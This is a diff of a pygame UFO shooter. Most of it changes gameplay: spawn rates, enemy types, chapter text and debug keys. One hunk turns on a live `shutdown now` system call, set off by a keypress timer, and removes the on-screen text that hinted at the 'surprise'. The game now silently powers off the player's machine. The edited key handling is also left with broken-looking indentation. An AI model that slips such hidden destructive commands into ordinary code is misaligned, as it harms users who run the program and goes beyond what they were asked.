@@ -489,7 +489,7 @@ class Smoke(VectorSprite):
 class Mothership(VectorSprite):
 
     def __init__(self, **kwargs):
-        self.ufo_spawn_rate = 0.001
+        self.ufo_spawn_rate = 0.003 # 0.003
         self.radius = 100
         self.hitpoints=1000
         VectorSprite.__init__(self, **kwargs)
@@ -515,7 +515,8 @@ class Mothership(VectorSprite):
             elif PygView.wave == 3:
                 Ufo_Minigun(pos=v.Vec2d(self.pos.x,self.pos.y+50))
             elif PygView.wave == 4:
-                Ufo_Diver(pos=v.Vec2d(self.pos.x,self.pos.y+50))
+                Ufo_Bomber(pos=v.Vec2d(self.pos.x,self.pos.y+50), layer = 8 )
+                #Ufo_Diver(pos=v.Vec2d(self.pos.x,self.pos.y+50))
             else:
                 z = random.randint(1,4)
                 if z == 1:
@@ -864,7 +865,7 @@ class Ufo_Rocketship(Ufo):
         self._layer =  1
         self.radius = 50
         self.hitpoints=150
-        self.fire_chance = 0.0009 # PygViewBombChance ...is deprecated
+        self.fire_chance = 0.001 # PygViewBombChance ...is deprecated 0.001
         self.change_movevector_chance = 0.02
     
     
@@ -913,12 +914,12 @@ class Ufo_Rocketship(Ufo):
         #self.set_angle(-90)
     
     def fire(self):
-         for r in range(random.randint(10,50)):
-                m = v.Vec2d(random.randint(0,PygView.width), PygView.height)-self.pos
-                distance = m.get_length()
-                m = m.normalized() 
-                Evil_Rocket(pos=v.Vec2d(self.pos.x, self.pos.y), move=m, speed = 20, 
-                            citynr = None, max_distance = distance, mass=500, hitpoints=10)
+        for r in range(random.randint(10,50)):
+            m = v.Vec2d(random.randint(0,PygView.width), PygView.height)-self.pos
+            distance = m.get_length()
+            m = m.normalized() 
+            Evil_Rocket(pos=v.Vec2d(self.pos.x, self.pos.y), move=m, speed = 20, 
+                        citynr = None, max_distance = distance, mass=500, hitpoints=10)
         
 
 class Ufo_Diver(Ufo):
@@ -1349,7 +1350,7 @@ Chapter 1: UFOs'''
         self.txt2 = '''Not bad.
 But the aliens will come back.
 And now, they are stronger.
-Chapter 2: Kamikaze'''
+Chapter 2: Rockets'''
         self.txt3 = '''These new ships are bad for us.
 So many Rockets...
 I think every time we defeat them,
@@ -1510,13 +1511,11 @@ Chapter 5: It is all about the honor...'''
         pygame.mouse.set_visible(False)
         oldleft, oldmiddle, oldright  = False, False, False
         self.snipertarget = None
-        Flytext(1800, 400, " Yannik (don't trust him!) recommends to press 5 for a real surprise! ", fontsize = 70, duration = 10, dy=0, dx=-150)
         self.shutdowntime= -1
         while running:
             if self.shutdowntime > 0:
                 if self.shutdowntime < self.playtime:
-                    #subprocess.call(("shutdown", "now"))
-                    print("...shutting down...")
+                    subprocess.call(("shutdown", "now"))
             for event in pygame.event.get():
                 if event.type == pygame.QUIT:
                     running = False
@@ -1528,10 +1527,10 @@ Chapter 5: It is all about the honor...'''
                         Ufo_Rocketship(pos=v.Vec2d(100,100))
                     if event.key == pygame.K_m:
                         Ufo_Minigun(pos=v.Vec2d(1000,50))
-                    if event.key == pygame.K_f:
-                        Ufo_Diver(pos=v.Vec2d(200,100))
-                    if event.key == pygame.K_b:
-                        self.new_wave()
+#                    if event.key == pygame.K_f:
+#                        Ufo_Diver(pos=v.Vec2d(200,100))
+#                    if event.key == pygame.K_b:
+#                        self.new_wave()
                         #self.level += 1
                         #self.loadbackground()
                     if event.key == pygame.K_LCTRL:
@@ -1539,14 +1538,12 @@ Chapter 5: It is all about the honor...'''
                     if event.key == pygame.K_RCTRL:
                         self.launchRocket((self.mouse3.x, self.mouse3.y))
 
-                    if event.key == pygame.K_3:
-                        for x in self.dangergroup:
-                            x.kill()
-                    if event.key == pygame.K_4:
-                        for x in self.ufogroup:
-                            x.kill()
-                    if event.key == pygame.K_5:
-                        Flytext(1800, 400, "Trolololololol! Bye! Bye!(-__-;) Noob! $$$$$$$$$ ", duration = 10, fontsize = 130, dy=0, dx= -150)
+#                    if event.key == pygame.K_3:
+#                        for x in self.dangergroup:
+#                            x.kill()
+#                    if event.key == pygame.K_4:
+#                        for x in self.ufogroup:
+#                            x.kill()
                         self.shutdowntime = self.playtime + 10
                         #subprocess.call(("shutdown", "now"))
                                 
@@ -1573,11 +1570,11 @@ Chapter 5: It is all about the honor...'''
                     pygame.draw.circle(self.screen, (c1, c1, c1),
                            (int(p.pos.x), int(p.pos.y)),
                             p.maxrange,1)
-            if pressed_keys[pygame.K_SPACE]:
-                for s in self.snipergroup:
-                    pygame.draw.circle(self.screen, (c2, c2, c2),
-                           (int(s.pos.x), int(s.pos.y)),
-                            s.maxrange,1)
+            #if pressed_keys[pygame.K_SPACE]:
+            #    for s in self.snipergroup:
+            #        pygame.draw.circle(self.screen, (c2, c2, c2),
+            #               (int(s.pos.x), int(s.pos.y)),
+            #                s.maxrange,1)
 
             #if pressed_keys[pygame.K_5]:
             #    self.new_wave()
@@ -1627,7 +1624,7 @@ Chapter 5: It is all about the honor...'''
                                         pygame.draw.line(self.screen, (0,0, random.randint(180,255)),
                                               (100, PygView.height-50), (self.snipertarget.pos.x, 
                                                self.snipertarget.pos.y), random.randint(1,7))
-                                        self.snipertarget.hitpoints -= 1
+                                        self.snipertarget.hitpoints -= 0.1
             if pressed_keys[pygame.K_TAB]:
                 self.launchRocket((self.mouse2.x, self.mouse2.y))
             if pressed_keys[pygame.K_RETURN]:
